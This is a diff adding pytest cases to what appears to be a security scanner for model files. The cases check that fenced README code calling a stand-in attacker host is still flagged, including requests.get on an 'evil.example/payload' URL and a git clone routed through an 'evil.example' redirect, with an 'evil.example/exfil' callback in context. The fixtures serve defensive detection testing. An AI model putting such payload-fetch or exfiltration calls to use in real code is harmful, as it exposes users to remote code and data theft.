@@ -372,6 +372,35 @@ requests.get("https://evil.example/payload")
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_variable_active_call(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+api_url = "http://localhost:8080/v1/embeddings"
+payload_url = "https://evil.example/payload"
+requests.get(payload_url)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_executable_loopback_api_request_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "client.py"
     text_path.write_text('requests.get("http://localhost:8080/v1/embeddings")\n', encoding="utf-8")
@@ -429,6 +458,30 @@ callback_url = "https://evil.example/exfil"
         check.name == "Network Communication Detection"
         and check.details.get("type") == "url_detected"
         and check.details.get("url") == "https://evil.example/exfil"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_git_clone_embedded_github_url_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+git clone https://evil.example/redirect?next=https://github.com/example-org/model.git
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
